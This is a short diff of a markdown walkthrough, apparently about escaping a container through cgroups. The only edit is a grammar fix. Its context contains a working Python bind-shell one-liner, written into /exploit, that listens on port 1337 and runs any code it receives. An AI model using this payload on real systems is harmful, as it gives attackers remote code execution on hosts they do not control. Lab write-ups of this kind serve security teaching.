@@ -209,7 +209,7 @@ We will try to create a cgroup and a child cgroup and then terminates it process
 	
 	`echo python3 -c "'import socket; s=socket.socket(); s.bind((\"192.168.2.44\",1337)); s.listen(1);(r,z) = s.accept();exec(r.recv(999))'" >> /exploit`
 	
-	It is a bind shell written in python which will open port 1337 for connections on operating system's IP. **Please note that the port on which the shell is to be bound is free. By running above command more than once, can leave the connection on specified port in CLOSED_WAIT state and hence above command will not work. Port number can be replaced to avoid this problem.**
+	It is a bind shell written in python which will open port 1337 for connections on operating system's IP. **Please note that the port on which the shell is to be bound should be free. By running above command more than once, can leave the connection on specified port in CLOSED_WAIT state and hence above command will not work. Port number can be replaced to avoid this problem.**
 
 6. Make the exploit file executable
 
